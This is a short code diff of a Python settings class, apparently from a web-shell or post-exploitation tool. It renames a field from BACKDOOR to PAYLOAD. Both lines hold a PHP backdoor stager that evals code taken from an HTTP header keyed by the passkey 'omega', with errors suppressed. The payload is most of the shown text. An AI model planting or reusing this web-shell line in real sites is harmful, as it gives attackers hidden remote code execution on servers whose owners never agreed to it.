@@ -70,7 +70,7 @@ class Settings(metadict.VarContainer):
 
         # Tunnel link opener
         self.TARGET = None
-        self.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
+        self.PAYLOAD = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
         self.PROXY = None
         self.PASSKEY = "omega"
 
